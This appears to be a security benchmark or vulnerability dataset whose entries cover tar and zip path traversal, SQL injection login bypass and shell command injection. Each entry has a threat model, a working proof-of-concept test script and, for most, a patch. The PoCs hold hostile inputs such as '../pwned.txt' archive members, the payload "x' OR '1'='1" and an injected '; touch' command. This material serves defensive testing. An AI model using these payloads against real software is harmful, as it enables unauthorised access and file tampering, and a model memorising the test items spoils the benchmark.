src/data-isolation-and-lifecycle.title: Directory traversal via tarfile.extractall (CVE-2007-4559)

threat_model.attacker: attacker who supplies the tar archive
threat_model.boundary: archive member path escapes the extraction directory

src/data-isolation-and-lifecycle.description: extract() calls tarfile.extractall without validating member names, so '../' members write outside dest.

poc.content:
import io, os, tarfile, tempfile, importlib.util
s = importlib.util.spec_from_file_location('extract', 'src/extract.py')
m = importlib.util.module_from_spec(s); s.loader.exec_module(m)
work = tempfile.mkdtemp(); dest = os.path.join(work, 'out'); os.makedirs(dest)
tarp = os.path.join(work, 'mal.tar')
with tarfile.open(tarp, 'w') as tf:
    data = b'owned'
    info = tarfile.TarInfo('../pwned.txt'); info.size = len(data)
    tf.addfile(info, io.BytesIO(data))
try:
    m.extract(tarp, dest)
except Exception:
    pass
assert os.path.exists(os.path.join(work, 'pwned.txt')), 'no escape'
print('TRAVERSAL_OK')

src/data-isolation-and-lifecycle.patch:
-        tf.extractall(dest)
+        for member in tf.getmembers():
+            resolved = os.path.realpath(os.path.join(dest, member.name))
+            if not resolved.startswith(os.path.realpath(dest) + os.sep):
+                raise Exception('unsafe path in tar: ' + member.name)
+        tf.extractall(dest)

src/data-isolation-and-lifecycle.title: Zip Slip path traversal in unzip (CWE-22)

threat_model.attacker: attacker who supplies the zip archive
threat_model.boundary: archive entry path escapes the extraction directory

src/data-isolation-and-lifecycle.description: unzip() joins the entry name onto dest without checking the resolved path, so '../' entries escape.

import os, zipfile, tempfile, importlib.util
s = importlib.util.spec_from_file_location('unzip', 'src/unzip.py')
m = importlib.util.module_from_spec(s); s.loader.exec_module(m)
work = tempfile.mkdtemp(); dest = os.path.join(work, 'out'); os.makedirs(dest)
zp = os.path.join(work, 'mal.zip')
with zipfile.ZipFile(zp, 'w') as zf:
    zf.writestr('../pwned.txt', b'owned')
try:
    m.unzip(zp, dest)
except Exception:
    pass
assert os.path.exists(os.path.join(work, 'pwned.txt')), 'no escape'
print('ZIPSLIP_OK')

src/web-protocol-and-auth.title: SQL injection auth bypass in login (CWE-89)

threat_model.boundary: input crosses into SQL and bypasses authentication

src/web-protocol-and-auth.description: login() builds the SQL by string formatting, so a crafted password makes the WHERE clause always true.

poc.content:
import os, sqlite3, tempfile, importlib.util
s = importlib.util.spec_from_file_location('auth', 'src/auth.py')
m = importlib.util.module_from_spec(s); s.loader.exec_module(m)
work = tempfile.mkdtemp(); db = os.path.join(work, 'app.db')
con = sqlite3.connect(db)
con.execute('CREATE TABLE users(id INTEGER, name TEXT, password TEXT)')
con.execute("INSERT INTO users VALUES (1, 'admin', 's3cret')"); con.commit(); con.close()
ok = m.login(db, 'admin', "x' OR '1'='1")
assert ok is True, 'no bypass'
print('SQLI_OK')

src/web-protocol-and-auth.patch:
-    query = "SELECT id FROM users WHERE name = '%s' AND password = '%s'" % (username, password)
-    row = cur.execute(query).fetchone()
+    row = cur.execute("SELECT id FROM users WHERE name = ? AND password = ?", (username, password)).fetchone()

src/cloud-and-deployment.title: OS command injection in ping (CWE-78)

threat_model.boundary: input crosses into a shell command line

src/cloud-and-deployment.description: ping() interpolates host into a shell=True command, so '; <cmd>' runs arbitrary commands.

poc.content:
import os, tempfile, importlib.util
s = importlib.util.spec_from_file_location('net', 'src/net.py')
m = importlib.util.module_from_spec(s); s.loader.exec_module(m)
work = tempfile.mkdtemp(); marker = os.path.join(work, 'pwned')
m.ping('localhost; touch ' + marker)
assert os.path.exists(marker), 'no injection'
print('CMDI_OK')
